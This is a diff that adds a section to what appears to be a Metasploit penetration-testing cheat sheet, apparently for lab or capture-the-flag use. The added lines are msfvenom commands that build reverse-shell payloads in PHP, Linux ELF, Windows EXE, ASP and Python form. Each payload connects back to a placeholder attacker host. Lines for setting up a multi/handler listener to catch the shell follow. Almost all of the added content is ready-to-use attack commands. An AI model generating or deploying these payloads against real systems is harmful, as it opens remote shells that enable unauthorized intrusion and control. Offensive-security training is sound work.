@@ -368,3 +368,17 @@ Once a vulnerability has been successfully exploited, a session will be created.
     hosts -R
 ### Search through services: 
     services -S <service>
+## Msfvenom
+### php payload:
+    msfvenom -p php/reverse_php LHOST=<attacker ip> LPORT=XXXX -f raw > reverse_shell.php
+### Linux ELF reverse_shell
+    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker ip> LPORT=XXXX -f elf > rev_shell.elf
+### Windows reverse_shell
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker ip> LPORT=XXXX -f exe > rev_shell.exe
+### ASP reverse_shell
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
+### Python reverse_shell
+    msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
+### Use a handler to catch the shell 
+    use exploit/multi/handler
+    set payload linux/x86/meterpreter/reverse_tcp (or any of the above payloads)
